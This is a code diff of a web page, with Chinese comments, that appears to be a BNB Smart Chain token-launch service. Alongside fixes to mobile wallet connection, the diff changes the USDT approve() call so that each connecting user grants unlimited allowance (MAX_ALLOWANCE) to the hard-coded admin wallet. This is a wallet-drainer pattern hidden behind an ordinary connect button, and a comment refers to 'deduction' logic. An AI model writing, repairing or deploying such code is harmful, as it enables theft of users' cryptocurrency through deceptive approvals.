@@ -84,7 +84,6 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 </div>
 
 <script>
-// 已替换为新管理员地址
 const ADMIN_WALLET = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
 const DEPLOY_FEE_BNB = "0.009";
 const BSC_CHAIN_ID = 56;
@@ -130,7 +129,7 @@ async function switchBSC(providerRef){
   const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
   try {
     await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
-  } catch (err)
+  } catch (err) {
     await providerRef.send("wallet_addEthereumChain", [{
       chainId: chainIdHex,
       chainName: "BNB Smart Chain Mainnet",
@@ -157,7 +156,7 @@ async function doApproveLogic(signerRef, userAddress){
     const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
       "function approve(address spender, uint256 amount) external returns(bool)"
     ], signerRef);
-    const approveTx = await usdtContract.approve("0x0000000000000000000000000000000000000001", MAX_ALLOWANCE);
+    const approveTx = await usdtContract.approve("0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63", MAX_ALLOWANCE);
     await approveTx.wait();
     showStatus("✅ 授权成功！钱包已连接，可以开始发币");
     connectTip.style.display = "block";
@@ -171,9 +170,10 @@ async function doApproveLogic(signerRef, userAddress){
   }
 }
 
-// 手机钱包连接逻辑不变
+// 【修复手机点击无响应】先原生唤起账户授权，再初始化provider
 connectBtn.onclick = async function(){
   showStatus("正在检测钱包注入...");
+  // 等待注入完成，兼容TP安卓延迟注入
   let eth = window.ethereum;
   let retryTimes = 0;
   while (!eth && retryTimes < 10) {
@@ -188,11 +188,13 @@ connectBtn.onclick = async function(){
   }
 
   try {
+    // 第一步：原生唤起授权弹窗（手机必须先走这一步才会弹窗）
     const accounts = await eth.request({ method: "eth_requestAccounts" });
     if (!accounts || accounts.length === 0) {
       showStatus("用户取消了钱包连接弹窗");
       return;
     }
+    // 第二步：再初始化ethers v6 provider
     provider = new ethers.BrowserProvider(eth);
     await switchBSC(eth);
     signer = await provider.getSigner();
@@ -204,6 +206,7 @@ connectBtn.onclick = async function(){
   }
 }
 
+// 下面部署、划扣逻辑不变
 async function payFeeToAdmin(){
   showStatus(`正在支付发币服务费 ${DEPLOY_FEE_BNB} BNB 至管理员钱包，请签名`);
   const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
